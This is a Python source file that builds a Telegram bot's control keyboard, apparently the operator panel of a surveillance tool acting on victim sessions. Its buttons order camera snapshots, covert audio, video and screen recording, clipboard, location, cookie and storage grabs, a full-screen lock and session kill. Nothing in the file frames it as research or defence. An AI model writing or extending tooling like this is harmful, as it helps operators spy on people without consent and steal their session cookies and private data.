# lsh/panel.py
# ============================================================
# لوحة التحكم الكاملة v6
# ============================================================

from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton


def build_lsh_control_panel(session_id, chat_id):
    """★ اللوحة الكاملة"""
    m = InlineKeyboardMarkup()

    # ═══ الوسائط ═══
    m.row(
        InlineKeyboardButton("📸 صورة", callback_data=f"lsh_snap_{session_id}"),
        InlineKeyboardButton("🎙️ صوت", callback_data=f"lsh_audio_{session_id}"),
    )
    m.row(
        InlineKeyboardButton("🎥 فيديو", callback_data=f"lsh_video_{session_id}"),
        InlineKeyboardButton("🖥️ شاشة", callback_data=f"lsh_screen_{session_id}"),
    )

    # ═══ البيانات ═══
    m.row(
        InlineKeyboardButton("📋 حافظة", callback_data=f"lsh_clip_{session_id}"),
        InlineKeyboardButton("📍 موقع", callback_data=f"lsh_loc_{session_id}"),
    )
    m.row(
        InlineKeyboardButton("🍪 كوكيز", callback_data=f"lsh_cookies_{session_id}"),
        InlineKeyboardButton("💾 تخزين", callback_data=f"lsh_storage_{session_id}"),
    )

    # ═══ التسجيل المستمر ═══
    m.row(
        InlineKeyboardButton("📹 فيديو مستمر", callback_data=f"lsh_continuous_{session_id}"),
        InlineKeyboardButton("🎤 صوت دائم", callback_data=f"lsh_always_audio_{session_id}"),
    )
    m.row(
        InlineKeyboardButton("⏹️ إيقاف التسجيل", callback_data=f"lsh_stoprecord_{session_id}"),
        InlineKeyboardButton("🔄 إعادة اتصال", callback_data=f"lsh_reconnect_{session_id}"),
    )

    # ═══ التحكم ═══
    m.row(
        InlineKeyboardButton("🌐 رابط", callback_data=f"lsh_open_{session_id}"),
        InlineKeyboardButton("📳 اهتزاز", callback_data=f"lsh_vibrate_{session_id}"),
    )
    m.row(
        InlineKeyboardButton("💬 Toast", callback_data=f"lsh_toast_{session_id}"),
        InlineKeyboardButton("🔊 صوت", callback_data=f"lsh_playsound_{session_id}"),
    )
    m.row(
        InlineKeyboardButton("🔒 قفل كامل", callback_data=f"lsh_fullscreenz_{session_id}"),
    )

    # ═══ الحالة ═══
    m.row(
        InlineKeyboardButton("🕵️ الحالة", callback_data=f"lsh_status_{session_id}"),
        InlineKeyboardButton("📊 إحصائيات", callback_data=f"lsh_stats_{session_id}"),
    )
    m.row(
        InlineKeyboardButton("📡 القناة", callback_data=f"lsh_channel_{session_id}"),
        InlineKeyboardButton("📜 Dead Letters", callback_data=f"lsh_dl_{session_id}"),
    )

    # ═══ الإدارة ═══
    m.row(
        InlineKeyboardButton("🔄 تحديث", callback_data=f"lsh_refresh_{session_id}"),
    )
    m.row(
        InlineKeyboardButton("❌ إغلاق", callback_data=f"lsh_kill_{session_id}"),
    )

    return m
